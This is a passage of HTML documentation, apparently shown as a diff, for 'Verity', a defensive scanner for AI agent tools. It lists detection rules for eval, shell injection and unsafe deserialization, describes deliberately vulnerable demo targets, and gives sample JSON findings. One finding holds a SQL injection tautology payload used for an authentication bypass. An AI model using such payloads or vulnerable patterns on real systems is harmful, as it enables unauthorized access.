+<tbody>
+<tr>
+<td>VERITY-AST-CWE-94-EVAL</td>
+<td>Unsafe Dynamic Code Evaluation (eval/exec)</td>
+<td>Direct evaluation of agent-controlled expressions and statements</td>
+</tr>
+<tr>
+<td>VERITY-AST-CWE-94-COMPILE</td>
+<td>Dynamic Code Compilation (compile)</td>
+<td>Bytecode built from agent-controlled source strings</td>
+</tr>
+<tr>
+<td>VERITY-AST-CWE-78-SHELL</td>
+<td>Command Injection via shell=True Subprocess</td>
+<td>Subprocess calls that pass a string to a shell</td>
+</tr>
+<tr>
+<td>VERITY-AST-CWE-78-SYSTEM</td>
+<td>Direct OS Shell Execution (os.system / os.popen)</td>
+<td>Unsanitized shell invocation without argument separation</td>
+</tr>
+<tr>
+<td>VERITY-AST-CWE-22-TRAVERSAL</td>
+<td>Unvalidated Path Traversal / Boundary Breakout</td>
+<td>Dynamic paths resolved without canonical containment checks</td>
+</tr>
+<tr>
+<td>VERITY-AST-CWE-502-PICKLE</td>
+<td>Insecure Object Deserialization (pickle/marshal)</td>
+<td>Untrusted pickle and marshal blobs that run <strong>reduce</strong> hooks</td>
+</tr>
+<tr>
+<td>VERITY-AST-CWE-502-YAML</td>
+<td>Insecure YAML Deserialization</td>
+<td>yaml.load() without a safe loader</td>
+</tr>
+<tr>
+<td>VERITY-AST-CWE-79-XSS</td>
+<td>Unescaped HTML / Script Injection in Tool Output</td>
+<td>Agent input interpolated into markup without escaping</td>
+</tr>
+<tr>
+<td>VERITY-AST-CWE-862-BOLA</td>
+<td>Missing Session Tenant Verification in Multi-Tenant Tool</td>
+<td>Tenant-scoped reads that skip the session tenant check</td>
+</tr>
+</tbody>
+</table>
+<h3 id="sqlsecurityguard-dialects-7">SqlSecurityGuard dialects (7)<a class="headerlink" href="#sqlsecurityguard-dialects-7" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Dialect</th>
+<th>Flag value</th>
+<th>Coverage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PostgreSQL</td>
+<td><code>postgres</code></td>
+<td>Parameterization, tenant predicates, limit checks</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>mysql</code></td>
+<td>String interpolation, dangerous functions, unbounded reads</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>sqlite</code></td>
+<td>Injection patterns and pragma risks</td>
+</tr>
+<tr>
+<td>DuckDB</td>
+<td><code>duckdb</code></td>
+<td>Analytical query review and file access</td>
+</tr>
+<tr>
+<td>T-SQL</td>
+<td><code>tsql</code></td>
+<td>Dynamic SQL, <code>EXEC</code>, tenant isolation</td>
+</tr>
+<tr>
+<td>BigQuery</td>
+<td><code>bigquery</code></td>
+<td>Dataset scoping, dynamic SQL, cost controls</td>
+</tr>
+<tr>
+<td>Snowflake</td>
+<td><code>snowflake</code></td>
+<td>Role scoping, injection, unbounded reads</td>
+</tr>
+</tbody>
+</table>
+<h3 id="zero-docker-vulnerable-targets-4">Zero-Docker vulnerable targets (4)<a class="headerlink" href="#zero-docker-vulnerable-targets-4" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>CWE</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SQLite Basic Target</td>
+<td>CWE-89</td>
+<td>Demonstrate SQL injection in a local AI DB agent</td>
+</tr>
+<tr>
+<td>PostgreSQL Multi-Tenant Target</td>
+<td>CWE-639</td>
+<td>Prove BOLA/IDOR across tenants</td>
+</tr>
+<tr>
+<td>MongoDB NoSQL Target</td>
+<td>CWE-943</td>
+<td>Detect NoSQL operator injection</td>
+</tr>
+<tr>
+<td>MCP Code Execution Target</td>
+<td>CWE-94</td>
+<td>Demonstrate unsafe eval/exec through tool input</td>
+</tr>
+</tbody>
+</table>
+<h3 id="verity-serve-mcp-tools-4"><code>verity serve</code> MCP tools (4)<a class="headerlink" href="#verity-serve-mcp-tools-4" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>verity_security_scan</code></td>
+<td>Run static, AST, and configuration scans</td>
+</tr>
+<tr>
+<td><code>verity_database_guard</code></td>
+<td>Validate SQL for a selected dialect</td>
+</tr>
+<tr>
+<td><code>verity_database_oracle</code></td>
+<td>Compare vulnerable and patched behavior</td>
+</tr>
+<tr>
+<td><code>verity_remediation_ops</code></td>
+<td>Return prioritized fixes with evidence</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="agent-native-mcp-server">Agent-Native MCP Server<a class="headerlink" href="#agent-native-mcp-server" title="Permanent link">&para;</a></h2>
+<p><code>verity serve</code> speaks stdio or SSE JSON-RPC and exposes four canonical tools.
+Each one accepts the same evidence shapes the CLI already produces, so an
+assistant never has to reimplement a check.</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>verity_security_scan</code></td>
+<td>Run static, AST, and configuration scans and return prioritised findings.</td>
+</tr>
+<tr>
+<td><code>verity_database_guard</code></td>
+<td>Validate a statement or filter document for a selected dialect.</td>
+</tr>
+<tr>
+<td><code>verity_database_oracle</code></td>
+<td>Compare vulnerable and patched behaviour to prove a fix.</td>
+</tr>
+<tr>
+<td><code>verity_remediation_ops</code></td>
+<td>Return prioritised fixes, patches, and wrapper configuration.</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>verity<span class="w"> </span>serve<span class="w"> </span>--transport<span class="w"> </span>stdio
+</code></pre></div>
+<hr />
+<h2 id="output-formats">Output formats<a class="headerlink" href="#output-formats" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Output format</th>
+<th>Edition</th>
+<th>Typical use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--format terminal</code></td>
+<td>Free</td>
+<td>Human-readable summary for a local shell.</td>
+</tr>
+<tr>
+<td><code>--format json</code></td>
+<td>Free</td>
+<td>Machine-readable artifact for pipelines and triage.</td>
+</tr>
+<tr>
+<td><code>--format markdown</code></td>
+<td>Free</td>
+<td>Pull request comment body.</td>
+</tr>
+<tr>
+<td><code>--format html</code></td>
+<td>Free</td>
+<td>Self-contained report for reviewers.</td>
+</tr>
+<tr>
+<td><code>--format sarif</code></td>
+<td>[Pro]</td>
+<td>OASIS SARIF v2.1.0 upload for code-scanning dashboards.</td>
+</tr>
+</tbody>
+</table>
+<p>In Verity Free, <code>--format sarif</code> returns <code>PRO_FEATURE_REQUIRED</code> (exit code 2); SARIF v2.1.0 export requires <code>verity-pro</code>. Specifically, Free emits <code>"ok": false</code>, <code>"verdict": "PRO_REQUIRED"</code>, and <code>"error": "PRO_FEATURE_REQUIRED"</code> with zero partial file writes even when <code>--output</code> is supplied; when <code>verity-pro</code> is installed, <code>--format sarif</code> and <code>ComplianceReportEngine.generate_bundle()</code> preserve exact <code>physicalLocation.region.startLine</code> (falling back to <code>startLine: 1</code> when line info is absent) and <code>artifactLocation.uri</code>, and OSV v1.6.0 records store <code>AIVSS</code> under <code>database_specific.aivss</code>.</p>
+<hr />
+<h2 id="zero-docker-demo-targets">Zero-Docker demo targets<a class="headerlink" href="#zero-docker-demo-targets" title="Permanent link">&para;</a></h2>
+<p>Four intentionally vulnerable servers run in-process, so exploit verification
+works on a laptop and on an ephemeral CI runner without Docker, cloud accounts,
+or production access.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>verity<span class="w"> </span><span class="nb">test</span><span class="w"> </span>--target<span class="w"> </span>sqlite-basic<span class="w"> </span>--demo<span class="w"> </span>--format<span class="w"> </span>json
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>verity<span class="w"> </span><span class="nb">test</span><span class="w"> </span>--target<span class="w"> </span>postgres-basic<span class="w"> </span>--demo<span class="w"> </span>--format<span class="w"> </span>json
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>verity<span class="w"> </span><span class="nb">test</span><span class="w"> </span>--target<span class="w"> </span>mongo-basic<span class="w"> </span>--demo<span class="w"> </span>--format<span class="w"> </span>json
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>verity<span class="w"> </span><span class="nb">test</span><span class="w"> </span>--target<span class="w"> </span>code-exec-basic<span class="w"> </span>--demo<span class="w"> </span>--format<span class="w"> </span>json
+</code></pre></div>
+<p>Each transcript contains the executed probe, the evidence, and remediation text
+for the finding it proves.</p>
+<hr />
+<h2 id="architecture">Architecture<a class="headerlink" href="#architecture" title="Permanent link">&para;</a></h2>
+<pre class="mermaid"><code>flowchart LR
+    subgraph Clients["IDE &amp; Assistant Clients"]
+        CD[Claude Desktop]
+        CU[Cursor]
+        WS[Windsurf]
+        VS[VS Code]
+        CL[Cline]
+        CO[Continue]
+        ZD[Zed]
+    end
+
+    subgraph Interface["Verity Interface"]
+        CLI[verity CLI]
+        SRV[verity serve MCP]
+        POL[Policy &amp; Thresholds]
+    end
+
+    subgraph Engine["Analysis Engine"]
+        DISC[Config Discovery]
+        STATIC[13 Static Rules]
+        AST[9 AST Rules]
+        GUARD[SqlSecurityGuard]
+        ORACLE[Exploit Oracle]
+        FIX[Remediation Planner]
+    end
+
+    subgraph Targets["Zero-Docker Targets"]
+        T1[SQLite CWE-89]
+        T2[PostgreSQL CWE-639]
+        T3[MongoDB CWE-943]
+        T4[MCP Exec CWE-94]
+    end
+
+    subgraph Output["Evidence &amp; Gates"]
+        JSON[JSON Report]
+        SARIF[SARIF]
+        HTML[HTML Summary]
+        EXIT[Deterministic Exit Code]
+    end
+
+    CD --&gt; CLI
+    CU --&gt; CLI
+    WS --&gt; CLI
+    VS --&gt; CLI
+    CL --&gt; CLI
+    CO --&gt; CLI
+    ZD --&gt; CLI
+    CD --&gt; SRV
+    CU --&gt; SRV
+    WS --&gt; SRV
+    VS --&gt; SRV
+    CL --&gt; SRV
+    CO --&gt; SRV
+    ZD --&gt; SRV
+    CLI --&gt; DISC
+    SRV --&gt; DISC
+    DISC --&gt; STATIC
+    DISC --&gt; AST
+    DISC --&gt; GUARD
+    STATIC --&gt; ORACLE
+    AST --&gt; ORACLE
+    GUARD --&gt; ORACLE
+    ORACLE --&gt; T1
+    ORACLE --&gt; T2
+    ORACLE --&gt; T3
+    ORACLE --&gt; T4
+    ORACLE --&gt; FIX
+    FIX --&gt; JSON
+    FIX --&gt; SARIF
+    FIX --&gt; HTML
+    POL --&gt; EXIT
+    JSON --&gt; EXIT
+    SARIF --&gt; EXIT</code></pre>
+<p>The CLI and MCP server share one discovery and analysis core, so IDE-driven scans and pipeline scans produce consistent rule IDs and evidence. Targets are isolated in-process, making exploit verification reproducible on laptops and ephemeral CI runners.</p>
+<hr />
+<h2 id="end-to-end-walkthroughs">End-to-end walkthroughs<a class="headerlink" href="#end-to-end-walkthroughs" title="Permanent link">&para;</a></h2>
+<h3 id="walkthrough-1-sqlite-basic-target-with-verity-test-demo">Walkthrough 1: SQLite Basic Target with <code>verity test --demo</code><a class="headerlink" href="#walkthrough-1-sqlite-basic-target-with-verity-test-demo" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>$<span class="w"> </span>uv<span class="w"> </span>run<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">"import verity; print(verity.__version__)"</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="m">0</span>.2.2
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>$<span class="w"> </span>verity<span class="w"> </span><span class="nb">test</span><span class="w"> </span>--target<span class="w"> </span>sqlite-basic<span class="w"> </span>--demo<span class="w"> </span>--format<span class="w"> </span>json
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">{</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span><span class="nt">"schema_version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0"</span><span class="p">,</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">  </span><span class="nt">"tool"</span><span class="p">:</span><span class="w"> </span><span class="s2">"verity"</span><span class="p">,</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">  </span><span class="nt">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0.2.2"</span><span class="p">,</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">  </span><span class="nt">"target"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sqlite-basic"</span><span class="p">,</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">    </span><span class="nt">"cwe"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CWE-89"</span><span class="p">,</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">    </span><span class="nt">"mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"zero-docker"</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">  </span><span class="p">},</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">  </span><span class="nt">"summary"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">    </span><span class="nt">"tests"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="w">    </span><span class="nt">"passed"</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="w">    </span><span class="nt">"failed"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="w">    </span><span class="nt">"highest_severity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"high"</span>
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="w">  </span><span class="p">},</span>
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="w">  </span><span class="nt">"findings"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="w">    </span><span class="p">{</span>
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="w">      </span><span class="nt">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"VERITY-STATIC-SQL-INJECTION-SCHEMA"</span><span class="p">,</span>
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="w">      </span><span class="nt">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SQL Injection Sequence in Schema Defaults"</span><span class="p">,</span>
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="w">      </span><span class="nt">"severity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"high"</span><span class="p">,</span>
+<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="w">      </span><span class="nt">"evidence"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a><span class="w">        </span><span class="nt">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SELECT * FROM users WHERE name = 'admin' OR '1'='1'"</span><span class="p">,</span>
+<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="w">        </span><span class="nt">"result"</span><span class="p">:</span><span class="w"> </span><span class="s2">"authentication_bypass"</span>
+<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a><span class="w">      </span><span class="p">},</span>
+<a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="w">      </span><span class="nt">"remediation"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Use parameterized queries and validate model-generated SQL."</span>
+<a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a><span class="w">  </span><span class="p">]</span>
+<a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="walkthrough-2-postgresql-multi-tenant-target-with-verity-test-demo">Walkthrough 2: PostgreSQL Multi-Tenant Target with <code>verity test --demo</code><a class="headerlink" href="#walkthrough-2-postgresql-multi-tenant-target-with-verity-test-demo" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>$<span class="w"> </span>verity<span class="w"> </span><span class="nb">test</span><span class="w"> </span>--target<span class="w"> </span>postgres-basic<span class="w"> </span>--demo<span class="w"> </span>--format<span class="w"> </span>json
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="p">{</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span><span class="nt">"schema_version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0"</span><span class="p">,</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">  </span><span class="nt">"tool"</span><span class="p">:</span><span class="w"> </span><span class="s2">"verity"</span><span class="p">,</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span><span class="nt">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0.2.2"</span><span class="p">,</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">  </span><span class="nt">"target"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">    </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"postgres-basic"</span><span class="p">,</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">    </span><span class="nt">"cwe"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CWE-639"</span><span class="p">,</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">    </span><span class="nt">"mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"zero-docker"</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">  </span><span class="p">},</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">  </span><span class="nt">"summary"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="w">    </span><span class="nt">"tests"</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="w">    </span><span class="nt">"passed"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="w">    </span><span class="nt">"failed"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="w">    </span><span class="nt">"highest_severity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"high"</span>
+<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="w">  </span><span class="p">},</span>
+<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="w">  </span><span class="nt">"findings"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="w">    </span><span class="p">{</span>
+<a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="w">      </span><span class="nt">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"VERITY-AST-CWE-862-BOLA"</span><span class="p">,</span>
+<a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="w">      </span><span class="nt">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Missing Session Tenant Verification in Multi-Tenant Tool"</span><span class="p">,</span>
+<a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="w">      </span><span class="nt">"severity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"high"</span><span class="p">,</span>
+<a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="w">      </span><span class="nt">"evidence"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="w">        </span><span class="nt">"authenticated_tenant"</span><span class="p">:</span><span class="w"> </span><span class="s2">"tenant-a"</span><span class="p">,</span>
+<a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a><span class="w">        </span><span class="nt">"requested_tenant"</span><span class="p">:</span><span class="w"> </span><span class="s2">"tenant-b"</span><span class="p">,</span>
+<a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a><span class="w">        </span><span class="nt">"records_exposed"</span><span class="p">:</span><span class="w"> </span><span class="mi">17</span>
+<a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a><span class="w">      </span><span class="p">},</span>
+<a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a><span class="w">      </span><span class="nt">"remediation"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Compare the requested tenant with the session tenant and deny mismatches."</span>
+<a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a><span class="w">  </span><span class="p">]</span>
+<a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="walkthrough-3-mcp-code-execution-target-with-verity-scan">Walkthrough 3: MCP Code Execution Target with <code>verity scan</code><a class="headerlink" href="#walkthrough-3-mcp-code-execution-target-with-verity-scan" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>$<span class="w"> </span>verity<span class="w"> </span><span class="nb">test</span><span class="w"> </span>--target<span class="w"> </span>code-exec-basic<span class="w"> </span>--format<span class="w"> </span>json
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">{</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span><span class="nt">"schema_version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0"</span><span class="p">,</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span><span class="nt">"tool"</span><span class="p">:</span><span class="w"> </span><span class="s2">"verity"</span><span class="p">,</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">  </span><span class="nt">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0.2.2"</span><span class="p">,</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">  </span><span class="nt">"scan"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">    </span><span class="nt">"target"</span><span class="p">:</span><span class="w"> </span><span class="s2">"code-exec-basic"</span><span class="p">,</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">    </span><span class="nt">"cwe"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CWE-94"</span><span class="p">,</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">    </span><span class="nt">"rules"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"VERITY-AST-CWE-94-EVAL"</span><span class="p">,</span><span class="w"> </span><span class="s2">"VERITY-AST-CWE-862-BOLA"</span><span class="p">,</span><span class="w"> </span><span class="s2">"VERITY-STATIC-SHELL-DROPPER"</span><span class="p">]</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="w">  </span><span class="p">},</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">  </span><span class="nt">"summary"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">    </span><span class="nt">"findings"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="w">    </span><span class="nt">"critical"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="w">    </span><span class="nt">"high"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">    </span><span class="nt">"medium"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="w">    </span><span class="nt">"exit_code"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="w">  </span><span class="p">},</span>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="w">  </span><span class="nt">"findings"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="w">    </span><span class="p">{</span>
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="w">      </span><span class="nt">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"VERITY-AST-CWE-94-EVAL"</span><span class="p">,</span>
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="w">      </span><span class="nt">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Unsafe Dynamic Code Evaluation (eval/exec)"</span><span class="p">,</span>
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="w">      </span><span class="nt">"severity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"critical"</span><span class="p">,</span>
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="w">      </span><span class="nt">"location"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">"file"</span><span class="p">:</span><span class="w"> </span><span class="s2">"agent/tools.py"</span><span class="p">,</span><span class="w"> </span><span class="nt">"line"</span><span class="p">:</span><span class="w"> </span><span class="mi">42</span><span class="p">},</span>
+<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="w">      </span><span class="nt">"evidence"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">"sink"</span><span class="p">:</span><span class="w"> </span><span class="s2">"eval"</span><span class="p">,</span><span class="w"> </span><span class="nt">"source"</span><span class="p">:</span><span class="w"> </span><span class="s2">"tool_input.code"</span><span class="p">},</span>
+<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a><span class="w">      </span><span class="nt">"remediation"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Replace eval with an allowlisted interpreter."</span>
+<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a><span class="w">    </span><span class="p">},</span>
+<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a><span class="w">    </span><span class="p">{</span>
